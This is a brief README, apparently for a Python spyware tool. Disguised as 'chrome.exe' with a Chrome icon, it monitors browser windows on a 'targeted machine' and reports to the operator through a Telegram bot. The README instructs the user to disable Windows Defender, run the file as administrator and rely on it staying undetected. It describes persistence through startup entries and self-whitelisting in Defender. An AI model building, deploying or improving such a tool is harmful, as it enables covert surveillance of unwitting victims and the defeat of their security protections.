Frist to use You need ID CHAT and Create bot in telegram and copy Your token (botFather)
When you want to generate or convert the tool to exe :
pyinstaller --onefile --noconsole --icon=chrome.ico chrome.py
when you want to install on y targeted machine 
1 -you need to stop  windows defender 
2 -execute the exe as administarteur 
!!! after will be not detect it and it will be turn on on start up  -_-

Overview
This tool monitors specific browser windows (Chrome, Firefox, Edge, etc.) and sends notifications via Telegram when detected. It adds itself to Windows startup and is added to the Windows Defender whitelist.

Features
Monitors browser windows and sends Telegram alerts.
Adds to Windows startup for persistence.
Whitelists itself in Windows Defender.
Requirements
Python 3.x
Windows OS
Libraries: pygetwindow, requests, pywin32
